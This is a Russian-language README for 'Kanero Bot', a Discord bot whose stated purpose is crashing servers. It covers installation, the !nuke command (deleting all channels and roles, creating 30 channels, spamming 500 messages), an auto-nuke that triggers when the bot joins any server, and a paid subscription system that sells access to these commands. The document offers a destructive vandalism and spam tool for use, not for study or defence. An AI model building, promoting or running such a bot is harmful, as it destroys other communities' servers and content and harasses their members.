## 🎯 Описание проекта

**Kanero Bot** — Discord бот для краша серверов с системой подписок и управления доступом.

### Основные возможности:
- 💀 **Краш серверов** — удаление каналов, ролей, массовый спам
- 🔐 **Система подписок** — Freelist, Whitelist, Premium
- ⏰ **Временные подписки** — компенсации с автоматическим истечением
- 🛡️ **Защита домашнего сервера** — блокировка деструктивных команд
- 📊 **Статистика и логи** — отслеживание всех действий
- 🎫 **Система тикетов** — поддержка пользователей

## 🚀 Установка и запуск

### Требования:
- Python 3.10+
- MongoDB (для хранения данных)
- Discord Bot Token

### Установка зависимостей:
```bash
pip install -r requirements.txt
```

### Настройка:
1. Откройте `config.py`
2. Вставьте токен бота в `TOKEN`
3. Укажите ваш Discord ID в `OWNER_ID`

### Запуск:
```bash
python main.py
```

Или используйте `start.bat` (Windows):
```bash
start.bat
```

## 🎮 Команды бота

### 💀 Команды краша (Freelist+)

#### `!nuke [текст]`
Базовый краш сервера:
- Удаление всех каналов
- Удаление всех ролей
- Создание 30 новых каналов
- Спам 500 сообщений
- Выдача роли ☠️ Kanero запустившему

**Кастомный текст** — только для Whitelist+

```bash
!nuke                    # Стандартный текст
!nuke Crashed by Me!     # Кастомный текст (Whitelist+)
```

#### `!cleanup`
Очистка после краша:
- Удаление всех каналов
- Создание канала `#general`
- Отправка текста спама (если краш был недавно)

#### `!auto_nuke <on/off/info>`
Автоматический краш при входе бота на новый сервер:
```bash
!auto_nuke on      # Включить
!auto_nuke off     # Выключить
!auto_nuke info    # Статус
```

#### `!stop`
Остановка текущего краша:
- Только тот кто запустил может остановить
- Premium может остановить краш обычного пользователя
- Овнер может остановить любой краш

### 🎁 Система компенсаций (Owner)

#### `!компенсация <тип> <время>`
Выдать временную подписку всем пользователям:

**Типы:**
- `pm` — Premium
- `wl` — Whitelist
- `fl` — Freelist

**Время:**
- `1h`, `6h`, `12h` — часы
- `1d`, `7d`, `30d` — дни

**Примеры:**
```bash
!компенсация pm 1d     # Premium на 1 день
!компенсация wl 7d     # Whitelist на 7 дней
!компенсация fl 12h    # Freelist на 12 часов
```

**Что происходит:**
1. Бот отправляет сообщение с кнопкой и пингом @everyone
2. Пользователи нажимают кнопку
3. Получают временную подписку
4. Лог отправляется в `#выдача-вайта`
5. Подписка автоматически истекает через указанное время

## ⏰ Система временных подписок

### Как это работает:

1. **Хранение в MongoDB:**
   ```python
   TEMP_SUBSCRIPTIONS = {
       user_id: {
           "type": "pm",  # pm/wl/fl
           "expires": datetime(2026, 4, 27, 12, 0, 0)
       }
   }
   ```

2. **Автоматическая проверка:**
   - При каждой проверке прав бот проверяет временные подписки
   - Если подписка истекла — автоматически удаляется

3. **Интеграция с правами:**
   ```python
   is_premium(user_id)      # Проверяет постоянный + временный premium
   is_whitelisted(user_id)  # Проверяет постоянный + временный whitelist
   is_freelisted(user_id)   # Проверяет постоянный + временный freelist
   ```

### Преимущества:
- ✅ Автоматическое истечение
- ✅ Не нужно вручную удалять
- ✅ Сохраняется в БД (не теряется при перезапуске)
- ✅ Логи в канале выдачи
